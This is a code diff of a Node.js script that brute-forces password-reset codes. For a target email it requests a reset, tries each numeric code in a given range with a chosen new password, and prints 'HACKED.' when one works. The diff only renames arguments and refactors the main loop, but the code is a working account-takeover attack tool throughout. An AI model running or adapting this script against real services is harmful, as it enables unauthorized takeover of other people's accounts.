@@ -3,8 +3,8 @@ const _colors = require('colors');
 
 const axios = require('axios');
 const argv = require('optimist')
-    .usage('Usage: $0 --email [test@mail.com] --password [hacked] --start [1000] --end [10000]')
-    .demand([ 'email', 'password', 'start', 'end' ])
+    .usage('Usage: $0 --target-email [test@mail.com] --new-password [hacked] --start [1000] --end [10000]')
+    .demand([ 'target-email', 'new-password', 'start', 'end' ])
     .argv;
 
 
@@ -45,15 +45,15 @@ async function submitAction(id, password, code) {
 }
 
 
-async function main({ start, email, end, password }) {
-    const action   = await createAction(email);
+async function main(args) {
+    const action   = await createAction(args['target-email']);
     const actionId = action.id;
     
-    const barValue = end - start;
+    const barValue = args.end - args.start;
     progressBar.start(barValue, 0);
 
-    for ( let i = start, k = 0; i < end; i++ ) {
-        const result   = await submitAction(actionId, password, i);
+    for ( let i = args.start, k = 0; i < args.end; i++ ) {
+        const result   = await submitAction(actionId, args['new-password'], i);
 
         if (result) {
             console.log('\nHACKED.');
